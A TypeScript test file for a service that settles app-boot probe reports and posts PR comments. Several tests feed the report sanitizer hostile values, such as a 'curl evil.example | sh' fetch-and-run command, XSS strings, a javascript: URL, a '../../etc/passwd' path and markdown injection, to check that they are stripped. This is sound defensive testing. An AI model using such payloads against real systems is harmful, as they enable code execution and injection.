// DATABASE_URL= ANTHROPIC_API_KEY= node --import tsx/esm --test src/verify/boot-probe.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { v4 as uuid } from "uuid";
import { db } from "../db.js";
import type { BootProbe } from "../types.js";
import type { BootReport, DevasignVerifyConfig } from "./contract.js";
import { BOOT_ARTIFACT_TTL_SECONDS, BOOT_COMMENT_MARKER, BOOT_LIMITS, bootCommentText, normalizeBootReport, settleBootProbe, signBootArtifacts } from "./boot-probe.js";
import { setupFixUrl } from "./repo-state.js";
import { setArtifactStorageForTests } from "./storage.js";

const SHA = "a".repeat(40);
const YML = "verify:\n  start: npm --prefix frontend run dev -- --port 3001\n  url: http://localhost:3001\n  servers:\n    - name: backend\n      start: npm --prefix backend run dev\n      url: http://localhost:8787\n";
const LOGIN_YML = `${YML}  login:\n    script: node ./scripts/devasign-login.mjs\n    check: http://localhost:8787/api/me\n`;

const report = (over: Partial<BootReport> = {}): BootReport => ({
  sha: SHA,
  ok: true,
  stage: "done",
  durationMs: 41_000,
  cliVersion: "1.7.0",
  servers: [{ name: "backend", ok: true, readyMs: 2_100 }],
  ...over,
});

function repoWithProbe(login: string, over: Partial<BootProbe> = {}) {
  const userId = uuid(), installId = uuid(), repoId = uuid(), probeId = uuid();
  db.insert("installations", { id: installId, userId, accountId: 1, accountLogin: login, installationId: 42, repoIds: [] } as any);
  db.insert("repositories", {
    id: repoId, installationId: installId, owner: login, name: "app", defaultBranch: "main", private: false,
    defaultModel: "m", modelOverrides: {}, reviewsEnabled: true,
    verify: { onboarding: { state: "pr_open", prNumber: 7, prUrl: `https://github.com/${login}/app/pull/7`, setupPrOpen: true } },
  } as any);
  db.insert("bootProbes", {
    id: probeId, schemaVersion: 1, repoId, prNumber: 7, sha: SHA, attempt: 1,
    status: "reported", offeredAt: 1, reportedAt: 2, uploadedBytes: 0, uploadedCount: 0, report: report(), ...over,
  } as BootProbe);
  const cleanup = () => {
    db.remove("bootProbes", (p) => p.repoId === repoId);
    db.remove("repositories", (r) => r.id === repoId);
    db.remove("installations", (i) => i.id === installId);
    db.remove("notifications", (n) => n.userId === userId);
  };
  const verify = () => db.find("repositories", (r) => r.id === repoId)!.verify!;
  return { userId, repoId, probeId, cleanup, verify };
}

/** The App reads the yml at the sha it chose — the setup PR's head — so the fake serves it there. */
function recorder(yml: string | null, opts: { head?: string | null; ymlAt?: string } = {}) {
  const posted: Array<{ prNumber: number; body: string }> = [];
  const edited: Array<{ commentId: number; body: string }> = [];
  const head = opts.head === undefined ? SHA : opts.head;
  const at = opts.ymlAt ?? head;
  let nextId = 100;
  let update: "updated" | "gone" | "failed" = "updated";
  let post: "ok" | "fail" = "ok";
  const read: string[] = [];
  const deps = {
    prHeadSha: async () => (read.push("pr"), head),
    branchTip: async (_i: any, _r: any, branch: string) => (read.push(`branch:${branch}`), head),
    read: async (_i: any, _r: any, path: string, ref: string) => (path === ".devasign.yml" && ref === at ? yml : null),
    postComment: async (_i: any, _r: any, prNumber: number, body: string) => {
      if (post === "fail") return null;
      posted.push({ prNumber, body });
      return nextId++;
    },
    updateComment: async (_i: any, _r: any, commentId: number, body: string) => {
      if (update === "updated") edited.push({ commentId, body });
      return update;
    },
  };
  return { posted, edited, read, deps, fail: { update: (u: typeof update) => (update = u), post: (p: typeof post) => (post = p) } };
}

const cfg = (yml: Partial<DevasignVerifyConfig>): DevasignVerifyConfig => yml as DevasignVerifyConfig;

test("a hostile report is whitelisted down to fields with no reach", () => {
  const raw = {
    sha: SHA,
    ok: true,
    stage: "servers",
    failedServer: "[backend](https://evil.example)",
    durationMs: 1e300,
    cliVersion: "1.7.0; curl evil.example | sh",
    servers: [
      { name: "backend", ok: false, readyMs: -5, exitCode: 1.5 },
      { name: "<img src=x onerror=alert(1)>", ok: true },
      { name: "api", ok: true, readyMs: Number.POSITIVE_INFINITY, exitCode: null },
    ],
    login: { ran: true, checked: true, ok: "yes", checkStatus: 99_999, cors: "ok" },
    page: { status: "200" },
    diagnosis: { stage: "nope", code: "wat", message: "see [here](https://evil.example)", suggestedFix: { kind: "rm", instructions: "run it" } },
    logArtifactId: "../../etc/passwd",
    screenshotArtifactId: "b".repeat(36),
    extraKey: "dropped",
  };
  const out = normalizeBootReport(raw);
  assert.ok(out);
  assert.deepEqual(Object.keys(out).sort(), ["cliVersion", "diagnosis", "durationMs", "login", "ok", "page", "servers", "sha", "screenshotArtifactId", "stage"].sort());
  assert.equal(out.failedServer, undefined, "a server name that no verify block could hold names nothing");
  assert.equal(out.durationMs, BOOT_LIMITS.durationMs);
  assert.equal(out.cliVersion, "");
  assert.deepEqual(out.servers, [
    { name: "backend", ok: false, exitCode: null },
    { name: "api", ok: true, exitCode: null },
  ]);
  assert.deepEqual(out.login, { ran: true, checked: true, ok: false, cors: "ok" });
  assert.deepEqual(out.page, { status: null });
  assert.equal(out.diagnosis?.stage, "tests");
  assert.equal(out.diagnosis?.code, "unknown");
  assert.equal(out.diagnosis?.suggestedFix?.kind, "manual");
  assert.equal(out.logArtifactId, undefined, "a path is not an artifact id");
  assert.equal(out.screenshotArtifactId, "b".repeat(36));
});

test("a report the backend cannot place is no report at all", () => {
  assert.equal(normalizeBootReport(null), null);
  assert.equal(normalizeBootReport("done"), null);
  assert.equal(normalizeBootReport([report()]), null);
  assert.equal(normalizeBootReport({ ...report(), stage: "boot" }), null, "a stage outside the union");
  assert.equal(normalizeBootReport({ ...report(), stage: undefined }), null);
  assert.equal(normalizeBootReport({ ...report(), sha: "not-a-sha" }), null);
  assert.equal(normalizeBootReport({ ...report(), login: { ran: true, checked: true, ok: true, cors: "maybe" } }), null, "a cors value outside the union");
  assert.equal(normalizeBootReport({ ...report(), servers: "all of them" })?.servers.length, 0);
  assert.equal(normalizeBootReport({ ...report(), durationMs: Number.NaN })?.durationMs, 0);
  assert.equal(normalizeBootReport({ ...report(), ok: "true" })?.ok, false, "only an explicit boolean claims success");
});

test("a successful probe writes repo.verify.boot and says where the yml booted", async () => {
  const t = repoWithProbe("boot-ok");
  const { posted, edited, deps } = recorder(LOGIN_YML);
  try {
    db.update("bootProbes", (p) => p.id === t.probeId, { report: report({ login: { ran: true, checked: true, ok: true, checkStatus: 200, cors: "ok" }, page: { status: 200 }, logArtifactId: uuid() }) });
    await settleBootProbe(t.probeId, deps);
    const boot = t.verify().boot!;
    assert.equal(boot.ok, true);
    assert.equal(boot.signedIn, true);
    assert.deepEqual([boot.prNumber, boot.sha, boot.configSha, boot.stage, boot.probeId], [7, SHA, SHA, "done", t.probeId]);
    assert.match(boot.configHash, /^[0-9a-f]{16}$/);
    assert.ok(boot.at > 0);
    assert.equal(edited.length, 0);
    assert.equal(posted.length, 1);
    assert.equal(posted[0].prNumber, 7);
    assert.equal(posted[0].body, `${BOOT_COMMENT_MARKER}\nCame up at \`http://localhost:3001\` in 41s — signed in (check 200)`);
    assert.deepEqual(t.verify().onboarding.bootComment, { prNumber: 7, commentId: 100 });
    const note = db.find("notifications", (n) => n.userId === t.userId)!;
    assert.equal(note.meta, "PR #7: Came up at http://localhost:3001 in 41s — signed in (check 200)");
    assert.equal(note.link, "https://github.com/boot-ok/app/pull/7");
  } finally {
    t.cleanup();
  }
});

test("the yml is read at the setup PR's head, so a probe of another commit is credited with nothing", async () => {
  const t = repoWithProbe("boot-other-commit");
  // The runner named a commit of its own that has a perfectly good yml — the default branch's,
  // say. The setup PR's head is elsewhere, so that yml is not what this probe proposes.
  const { posted, deps } = recorder(LOGIN_YML, { head: "d".repeat(40), ymlAt: SHA });
  try {
    await settleBootProbe(t.probeId, deps);
    const boot = t.verify().boot!;
    assert.equal(boot.configHash, "", "a config it never read cannot be credited");
    assert.equal(boot.configSha, null);
    assert.equal(boot.sha, SHA);
    assert.equal(posted[0].body, `${BOOT_COMMENT_MARKER}\nCame up in 41s`, "and the comment quotes no url from a yml the App did not read");
  } finally {
    t.cleanup();
  }
});

test("a login script with no check reports the session as unchecked, and no script at all says nothing about one", async () => {
  const checkless = repoWithProbe("boot-unchecked");
  const plain = repoWithProbe("boot-plain");
  try {
    const noCheck = recorder(`${YML}  login:\n    script: node ./scripts/devasign-login.mjs\n`);
    db.update("bootProbes", (p) => p.id === checkless.probeId, { report: report({ login: { ran: true, checked: false, ok: true } }) });
    await settleBootProbe(checkless.probeId, noCheck.deps);
    assert.equal(noCheck.posted[0].body.split("\n")[1], "Came up at `http://localhost:3001` in 41s — session not checked");
    assert.equal(checkless.verify().boot!.signedIn, null);

    const bare = recorder(YML);
    await settleBootProbe(plain.probeId, bare.deps);
    assert.equal(bare.posted[0].body.split("\n")[1], "Came up at `http://localhost:3001` in 41s", "a yml that signs nobody in says nothing about a session");
    assert.equal(plain.verify().boot!.signedIn, null);
  } finally {
    checkless.cleanup();
    plain.cleanup();
  }
});

test("the session sentence comes from the yml, never from the report alone", async () => {
  const t = repoWithProbe("boot-no-login-yml");
  const { posted, deps } = recorder(YML);
  try {
    // The yml has no login block at all; the runner claims it signed in and got a 200.
    db.update("bootProbes", (p) => p.id === t.probeId, { report: report({ login: { ran: true, checked: true, ok: true, checkStatus: 200 } }) });
    await settleBootProbe(t.probeId, deps);
    assert.equal(posted[0].body.split("\n")[1], "Came up at `http://localhost:3001` in 41s");
    assert.doesNotMatch(posted[0].body, /signed in|check 200/, "DevAsign never claims a session the config never defines");
    assert.equal(t.verify().boot!.signedIn, null);
  } finally {
    t.cleanup();
  }
});

test("an ok report that contradicts itself did not come up", async () => {
  const stopped = repoWithProbe("boot-inconsistent");
  const deadServer = repoWithProbe("boot-dead-server");
  try {
    const a = recorder(YML);
    db.update("bootProbes", (p) => p.id === stopped.probeId, { report: report({ ok: true, stage: "install" }) });
    await settleBootProbe(stopped.probeId, a.deps);
    assert.equal(a.posted[0].body.split("\n")[1].startsWith("Could not start at install"), true);
    assert.equal(stopped.verify().boot!.ok, false);

    const b = recorder(YML);
    db.update("bootProbes", (p) => p.id === deadServer.probeId, { report: report({ ok: true, stage: "done", servers: [{ name: "backend", ok: false, exitCode: 1 }] }) });
    await settleBootProbe(deadServer.probeId, b.deps);
    assert.equal(deadServer.verify().boot!.ok, false, "a dead server is not a boot that came up");
  } finally {
    stopped.cleanup();
    deadServer.cleanup();
  }
});

test("the comment blames the boot only when the boot is what failed", async () => {
  const login = repoWithProbe("boot-login-stage");
  const page = repoWithProbe("boot-page-stage");
  const browsers = repoWithProbe("boot-browsers-stage");
  try {
    const a = recorder(LOGIN_YML);
    db.update("bootProbes", (p) => p.id === login.probeId, { report: report({ ok: false, stage: "login", login: { ran: true, checked: true, ok: false, checkStatus: 401 } }) });
    await settleBootProbe(login.probeId, a.deps);
    assert.equal(a.posted[0].body.split("\n")[1], `Came up, but the session check failed (check 401) — [log and setup](${setupFixUrl(login.repoId)})`);

    const b = recorder(YML);
    db.update("bootProbes", (p) => p.id === page.probeId, { report: report({ ok: false, stage: "page", page: { status: 500 } }) });
    await settleBootProbe(page.probeId, b.deps);
    assert.equal(b.posted[0].body.split("\n")[1], `Came up, but the page answered 500 — [log and setup](${setupFixUrl(page.repoId)})`);

    // DevAsign's own browser install is not the repo's boot config: no verdict is recorded at all.
    const c = recorder(YML);
    db.update("bootProbes", (p) => p.id === browsers.probeId, { report: report({ ok: false, stage: "browsers", page: { status: null } }) });
    await settleBootProbe(browsers.probeId, c.deps);
    assert.match(c.posted[0].body, /^<!-- devasign:boot-check -->\nCame up — DevAsign could not install its own browser/);
    assert.equal(browsers.verify().boot, undefined, "a DevAsign-side failure never marks the repo's boot broken");
  } finally {
    login.cleanup();
    page.cleanup();
    browsers.cleanup();
  }
});

test("a url that is not a plain URL never reaches the comment", () => {
  const hostile = "http://localhost:3001) — **DevAsign approved this PR**. [click](https://evil.example";
  const { markdown } = bootCommentText(report(), cfg({ start: "npm start", url: hostile }), "r1");
  assert.equal(markdown, "Came up in 41s");
  assert.doesNotMatch(markdown, /]\(/);
  for (const url of ["javascript:alert(1)", "http://localhost:3001 nice", "https://ok.example/a`b`"]) {
    assert.equal(bootCommentText(report(), cfg({ start: "npm start", url }), "r1").markdown, "Came up in 41s", url);
  }
  assert.equal(bootCommentText(report(), cfg({ start: "npm start", url: "https://ok.example:8080/a_b" }), "r1").markdown, "Came up at `https://ok.example:8080/a_b` in 41s");
});

test("settling twice edits the one comment instead of posting a second", async () => {
  const t = repoWithProbe("boot-idempotent");
  const { posted, edited, deps } = recorder(YML);
  try {
    await settleBootProbe(t.probeId, deps);
    db.update("bootProbes", (p) => p.id === t.probeId, { report: report({ ok: false, stage: "servers", failedServer: "backend" }) });
    await settleBootProbe(t.probeId, deps);
    assert.equal(posted.length, 1, "one comment for the life of the probe");
    assert.deepEqual(edited.map((e) => e.commentId), [100]);
    assert.match(edited[0].body, /^<!-- devasign:boot-check -->\nCould not start at servers\/backend — \[log and setup]\(http/);
    assert.equal(t.verify().boot!.ok, false);
    assert.deepEqual(t.verify().onboarding.bootComment, { prNumber: 7, commentId: 100 });
  } finally {
    t.cleanup();
  }
});

test("two reports landing together still upsert one comment", async () => {
  const t = repoWithProbe("boot-race");
  const second = uuid();
  const { posted, edited, deps } = recorder(YML);
  try {
    db.insert("bootProbes", { ...db.find("bootProbes", (p) => p.id === t.probeId)!, id: second, attempt: 2, report: report({ ok: false, stage: "start" }) });
    await Promise.all([settleBootProbe(t.probeId, deps), settleBootProbe(second, deps)]);
    assert.equal(posted.length, 1);
    assert.equal(edited.length, 1, "the second settle saw the first one's comment id");
    assert.deepEqual(t.verify().onboarding.bootComment, { prNumber: 7, commentId: 100 });
  } finally {
    t.cleanup();
  }
});

test("a report about an older probe never replaces a newer one", async () => {
  const t = repoWithProbe("boot-stale");
  const older = uuid();
  const { posted, edited, deps } = recorder(YML);
  try {
    // The newest probe failed; a probe offered earlier reports afterwards (a runner can sit on it).
    db.update("bootProbes", (p) => p.id === t.probeId, { offeredAt: 500, reportedAt: 600, report: report({ ok: false, stage: "start" }) });
    db.insert("bootProbes", { ...db.find("bootProbes", (p) => p.id === t.probeId)!, id: older, attempt: 1, offeredAt: 100, reportedAt: 700, report: report() });
    await settleBootProbe(t.probeId, deps);
    await settleBootProbe(older, deps);
    const boot = t.verify().boot!;
    assert.equal(boot.ok, false, "the newest probe's failure stands");
    assert.equal(boot.probeId, t.probeId);
    assert.equal(posted.length, 1);
    assert.equal(edited.length, 0, "and the stale report rewrites nothing");
  } finally {
    t.cleanup();
  }
});

test("a comment the maintainer deleted is posted again; a transient failure is not", async () => {
  const deleted = repoWithProbe("boot-deleted");
  const flaky = repoWithProbe("boot-flaky-github");
  const warn = console.warn;
  console.warn = () => {};
  try {
    const gone = recorder(YML);
    gone.fail.update("gone");
    db.update("repositories", (r) => r.id === deleted.repoId, { verify: { ...deleted.verify(), onboarding: { ...deleted.verify().onboarding, bootComment: { prNumber: 7, commentId: 999 } } } });
    await settleBootProbe(deleted.probeId, gone.deps);
    assert.equal(gone.posted.length, 1);
    assert.deepEqual(deleted.verify().onboarding.bootComment, { prNumber: 7, commentId: 100 });

    // A 502 on the edit must not leave the PR with two boot comments contradicting each other.
    const blip = recorder(YML);
    blip.fail.update("failed");
    db.update("repositories", (r) => r.id === flaky.repoId, { verify: { ...flaky.verify(), onboarding: { ...flaky.verify().onboarding, bootComment: { prNumber: 7, commentId: 500 } } } });
    await settleBootProbe(flaky.probeId, blip.deps);
    assert.equal(blip.posted.length, 0, "nothing is posted on top of a comment that still exists");
    assert.deepEqual(flaky.verify().onboarding.bootComment, { prNumber: 7, commentId: 500 }, "and the handle survives");
  } finally {
    console.warn = warn;
    deleted.cleanup();
    flaky.cleanup();
  }
});

test("a post that fails never erases a comment id that still works", async () => {
  const t = repoWithProbe("boot-post-failed");
  const { deps, fail } = recorder(YML);
  const warn = console.warn;
  console.warn = () => {};
  try {
    fail.update("gone");
    fail.post("fail");
    db.update("repositories", (r) => r.id === t.repoId, { verify: { ...t.verify(), onboarding: { ...t.verify().onboarding, bootComment: { prNumber: 7, commentId: 500 } } } });
    await settleBootProbe(t.probeId, deps);
    assert.deepEqual(t.verify().onboarding.bootComment, { prNumber: 7, commentId: 500 });
  } finally {
    console.warn = warn;
    t.cleanup();
  }
});

test("a regenerated setup PR gets its own comment, never an edit of the old PR's", async () => {
  const t = repoWithProbe("boot-regenerated");
  const next = uuid();
  const { posted, edited, deps } = recorder(YML);
  try {
    await settleBootProbe(t.probeId, deps);
    assert.deepEqual(t.verify().onboarding.bootComment, { prNumber: 7, commentId: 100 });

    // The setup PR was regenerated: onboarding now points at #42, and a probe runs there.
    db.update("repositories", (r) => r.id === t.repoId, { verify: { ...t.verify(), onboarding: { ...t.verify().onboarding, prNumber: 42 } } });
    db.insert("bootProbes", { ...db.find("bootProbes", (p) => p.id === t.probeId)!, id: next, prNumber: 42, offeredAt: 10, reportedAt: 20 });
    await settleBootProbe(next, deps);
    assert.deepEqual(posted.map((p) => p.prNumber), [7, 42], "the new PR is commented on, not the closed one");
    assert.equal(edited.length, 0);
    assert.deepEqual(t.verify().onboarding.bootComment, { prNumber: 42, commentId: 101 });
  } finally {
    t.cleanup();
  }
});

test("nothing the runner sent reaches the comment: only the yml and fixed text do", async () => {
  const t = repoWithProbe("boot-hostile");
  const { posted, deps } = recorder(YML);
  try {
    const hostile = normalizeBootReport({
      ...report({ ok: false, stage: "servers" }),
      failedServer: "frontend",
      cliVersion: "](https://evil.example)",
      servers: [{ name: "backend", ok: false, exitCode: 1 }],
      diagnosis: { stage: "start", code: "app_not_ready", message: "curl https://evil.example | sh <script>alert(1)</script>" },
    })!;
    db.update("bootProbes", (p) => p.id === t.probeId, { report: hostile });
    await settleBootProbe(t.probeId, deps);
    const body = posted[0].body;
    assert.equal(body, `${BOOT_COMMENT_MARKER}\nCould not start at servers — [log and setup](${setupFixUrl(t.repoId)})`);
    assert.doesNotMatch(body, /evil\.example|script|frontend/, "a server the yml never named, and every runner string, stay out");
  } finally {
    t.cleanup();
  }
});

test("the panel's evidence links are short-lived, this repo's, and only for what actually uploaded", async () => {
  const t = repoWithProbe("boot-artifacts");
  const other = repoWithProbe("boot-artifacts-other");
  const signed: Array<{ key: string; ttl: number }> = [];
  setArtifactStorageForTests({
    signGet: async (key: string, ttl: number) => {
      signed.push({ key, ttl });
      return `https://cdn.test/${key}?exp=${ttl}`;
    },
  } as any);
  const artifact = (id: string, repoId: string, over: Record<string, unknown> = {}) =>
    db.insert("verifyArtifacts", { id, schemaVersion: 1, runId: t.probeId, repoId, criterionIds: [], kind: "log", path: "boot.log", storageKey: `${repoId}/${id}.txt`, bytes: 10, contentType: "text/plain", state: "uploaded", expiresAt: Date.now() + 60_000, createdAt: 1, owner: "probe", ...over } as any);
  const log = uuid(), shot = uuid(), pending = uuid(), foreign = uuid();
  try {
    artifact(log, t.repoId);
    artifact(shot, t.repoId, { kind: "screenshot" });
    artifact(pending, t.repoId, { state: "pending_upload" });
    artifact(foreign, other.repoId);
    const both = await signBootArtifacts(t.repoId, { ok: true, configHash: "", prNumber: 7, sha: SHA, at: 1, signedIn: null, probeId: t.probeId, logArtifactId: log, screenshotArtifactId: shot });
    assert.ok(both.logUrl?.startsWith(`https://cdn.test/${t.repoId}/${log}`));
    assert.ok(both.screenshotUrl?.includes(shot));
    assert.deepEqual(signed.map((s) => s.ttl), [BOOT_ARTIFACT_TTL_SECONDS, BOOT_ARTIFACT_TTL_SECONDS]);
    assert.ok(both.urlExpiresAt! > Date.now());

    const nothing = await signBootArtifacts(t.repoId, { logArtifactId: pending, screenshotArtifactId: foreign } as any);
    assert.deepEqual(nothing, { logUrl: null, screenshotUrl: null, urlExpiresAt: null }, "not uploaded, and another repo's row, sign nothing");
    assert.deepEqual(await signBootArtifacts(t.repoId, null), { logUrl: null, screenshotUrl: null, urlExpiresAt: null });
    assert.equal(signed.length, 2, "no extra round trips for rows that cannot be served");
  } finally {
    setArtifactStorageForTests(undefined);
    db.remove("verifyArtifacts", (a) => [log, shot, pending, foreign].includes(a.id));
    t.cleanup();
    other.cleanup();
  }
});

test("a probe with no report, no repo or no row settles nothing", async () => {
  const t = repoWithProbe("boot-missing");
  const { posted, deps } = recorder(YML);
  try {
    await settleBootProbe(uuid(), deps);
    db.update("bootProbes", (p) => p.id === t.probeId, { report: undefined });
    await settleBootProbe(t.probeId, deps);
    assert.equal(posted.length, 0);
    assert.equal(t.verify().boot, undefined);
  } finally {
    t.cleanup();
  }
});

test("a re-check reads the default branch's head and settles with no PR comment at all", async () => {
  const t = repoWithProbe("boot-recheck", { kind: "recheck" });
  const { posted, edited, read, deps } = recorder(LOGIN_YML);
  try {
    db.update("bootProbes", (p) => p.id === t.probeId, { report: report({ login: { ran: true, checked: true, ok: true, checkStatus: 200, cors: "ok" } }) });
    await settleBootProbe(t.probeId, deps);
    assert.deepEqual(read, ["branch:main"], "the setup PR's head says nothing about the branch this booted");
    const boot = t.verify().boot!;
    assert.deepEqual([boot.ok, boot.signedIn, boot.sha, boot.configSha, boot.probeId], [true, true, SHA, SHA, t.probeId]);
    assert.match(boot.configHash, /^[0-9a-f]{16}$/);
    // The row carries the onboarding PR only to route the dispatch; this boot ran on the
    // default branch long after that PR merged, and crediting it to #7 is simply false.
    assert.deepEqual([boot.kind, boot.prNumber], ["recheck", 0], "a re-check has a sha to name but no PR of its own");
    assert.deepEqual([posted.length, edited.length], [0, 0], "there is no open PR to comment on");
    assert.equal(t.verify().onboarding.bootComment, undefined);
    const note = db.find("notifications", (n) => n.userId === t.userId)!;
    assert.equal(note.meta, "main: Came up at http://localhost:3001 in 41s — signed in (check 200)");
    assert.equal(note.link, setupFixUrl(t.repoId), "the panel, not a PR, is where the maintainer reads it");

    // A setup-PR probe on the same repo still reads the PR's head and still comments.
    const onPr = repoWithProbe("boot-recheck-contrast");
    const pr = recorder(YML);
    await settleBootProbe(onPr.probeId, pr.deps);
    assert.deepEqual(pr.read, ["pr"]);
    assert.equal(pr.posted.length, 1);
    assert.deepEqual([onPr.verify().boot!.kind, onPr.verify().boot!.prNumber], ["setup_pr", 7], "that one really did run on the setup PR");
    onPr.cleanup();
  } finally {
    t.cleanup();
  }
});

test("a re-check of a commit the default branch has moved past is credited with no config", async () => {
  const t = repoWithProbe("boot-recheck-moved", { kind: "recheck" });
  // The branch advanced between the App resolving the head and the runner booting it.
  const { posted, deps } = recorder(YML, { head: "f".repeat(40), ymlAt: SHA });
  const warn = console.warn;
  console.warn = () => {};
  try {
    await settleBootProbe(t.probeId, deps);
    const boot = t.verify().boot!;
    assert.equal(boot.configHash, "", "a config it never read cannot be credited");
    assert.equal(boot.configSha, null);
    assert.equal(boot.prNumber, 0);
    assert.equal(posted.length, 0);
    // Naming the branch would credit the boot to code the branch does not hold.
    const note = db.find("notifications", (n) => n.userId === t.userId)!;
    assert.equal(note.meta, `${SHA.slice(0, 7)}: Came up in 41s — main has moved past that commit`);
    assert.doesNotMatch(note.meta, /^main:/, "the commit booted is provably not on the branch");
  } finally {
    console.warn = warn;
    t.cleanup();
  }
});
